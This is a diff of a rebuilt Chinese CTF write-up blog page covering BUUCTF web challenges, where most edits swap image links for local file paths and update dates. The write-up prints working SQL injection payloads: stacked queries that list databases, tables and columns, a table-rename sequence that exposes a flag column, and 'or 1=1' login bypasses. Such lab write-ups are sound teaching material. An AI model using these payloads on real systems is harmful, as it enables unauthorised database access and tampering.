@@ -28,11 +28,11 @@
 <meta property="og:description" content="Week 1 &lt;2020.07.13 - 2020.07.19&gt;[HCTF 2018]WarmUp打开实例，只有一张图片，右键查看网页代码：     &lt;!DOCTYPE html&gt;     &lt;html lang&#x3D;”en”&gt;    &lt;head&gt;    &lt;meta charset&#x3D;”UTF-8”&gt;    &lt;meta name&#x3D;”view">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://localhost:9002/file/image/5f17017f657e1fa600390ac1">
-<meta property="og:image" content="http://localhost:9002/file/image/5f186ec6657e1fa600390b7a">
-<meta property="og:image" content="http://localhost:9002/file/image/5f186ef6657e1fa600390b86">
-<meta property="og:image" content="http://localhost:9002/file/image/5f18709a657e1fa600390bc9">
+<meta property="og:image" content="c:%5CUsers%5CHp%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200726161826216.png">
+<meta property="og:image" content="c:%5CUsers%5CHp%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200726161841013.png">
+<meta property="og:image" content="c:%5CUsers%5CHp%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200726161859923.png">
 <meta property="article:published_time" content="2020-07-22T17:41:17.000Z">
-<meta property="article:modified_time" content="2020-07-22T17:42:39.758Z">
+<meta property="article:modified_time" content="2020-07-26T08:20:45.038Z">
 <meta property="article:author" content="Du11JK">
 <meta property="article:tag" content="CTF - Web">
 <meta name="twitter:card" content="summary">
@@ -222,10 +222,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2020-07-23 01:41:17 / 修改时间：01:42:39" itemprop="dateCreated datePublished" datetime="2020-07-23T01:41:17+08:00">2020-07-23</time>
+              <time title="创建时间：2020-07-23 01:41:17" itemprop="dateCreated datePublished" datetime="2020-07-23T01:41:17+08:00">2020-07-23</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-07-26 16:20:45" itemprop="dateModified" datetime="2020-07-26T16:20:45+08:00">2020-07-26</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -311,11 +317,11 @@
 <h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><p><strong>方法一：堆叠注入，重命名</strong></p>
 <p>SQL语句 ： </p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;; show databases#</span><br></pre></td></tr></table></figure>
-<p><img src="http://localhost:9002/file/image/5f186ec6657e1fa600390b7a" alt=""><br>SQL语句 ： </p>
+<p><img src="C:%5CUsers%5CHp%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200726161826216.png" alt="image-20200726161826216"><br>SQL语句 ： </p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;; show tables#</span><br></pre></td></tr></table></figure>
-<p><img src="http://localhost:9002/file/image/5f186ef6657e1fa600390b86" alt=""><br>SQL语句：</p>
+<p><img src="C:%5CUsers%5CHp%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200726161841013.png" alt="image-20200726161841013"></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;show columns from &#96;1919810931114514&#96;;#</span><br></pre></td></tr></table></figure>
-<p><img src="http://localhost:9002/file/image/5f18709a657e1fa600390bc9" alt=""><br>此处发现了flag字段，以下重点：<br>重命名：</p>
+<p><img src="C:%5CUsers%5CHp%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200726161859923.png" alt="image-20200726161859923"><br>此处发现了flag字段，以下重点：<br>重命名：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0&#39;;</span><br><span class="line">rename table words to words1;</span><br><span class="line">rename table &#96;1919810931114514&#96; to words;</span><br><span class="line">alter table words change flag id varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;</span><br><span class="line">desc  words;#</span><br></pre></td></tr></table></figure>
 <p>再操作取得flag：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; or 1&#x3D;1#</span><br></pre></td></tr></table></figure>
@@ -339,7 +345,7 @@
 <p>flag{13a1a49a-d096-4a5b-aac0-ef90df2f1b2c}</p>
 <h2 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h2><p>随便试一下就过了。。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39; or 1&#x3D;1 #</span><br></pre></td></tr></table></figure>
-<p>URL：<a href="http://0f6b6f42-6865-4b45-83d5-e32a7f3ab954.node3.buuoj.cn/check.php?username=admin%27or%271%27=%271&amp;password=admin%27or%271%27=%271" target="_blank" rel="noopener">http://0f6b6f42-6865-4b45-83d5-e32a7f3ab954.node3.buuoj.cn/check.php?username=admin%27or%271%27=%271&amp;password=admin%27or%271%27=%271</a></p>
+<p>URL:<a href="http://0f6b6f42-6865-4b45-83d5-e32a7f3ab954.node3.buuoj.cn/check.php?username=admin%27or%271%27=%271&amp;password=admin%27or%271%27=%271" target="_blank" rel="noopener">http://0f6b6f42-6865-4b45-83d5-e32a7f3ab954.node3.buuoj.cn/check.php?username=admin%27or%271%27=%271&amp;password=admin%27or%271%27=%271</a></p>
 <p>flag{d1d4ffc6-0e42-4ae0-b177-985390fbf756}</p>
 
     </div>
@@ -381,7 +387,10 @@
     <a href="/2020/07/22/PE-Files-1/" rel="prev" title="PE Files (1)">
       <i class="fa fa-chevron-left"></i> PE Files (1)
     </a></div>
-      <div class="post-nav-item"></div>
+      <div class="post-nav-item">
+    <a href="/2020/07/26/week20200720-20200726/" rel="next" title="week20200720-20200726">
+      week20200720-20200726 <i class="fa fa-chevron-right"></i>
+    </a></div>
     </div>
       </footer>
     
@@ -456,7 +465,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">2</span>
+          <span class="site-state-item-count">3</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
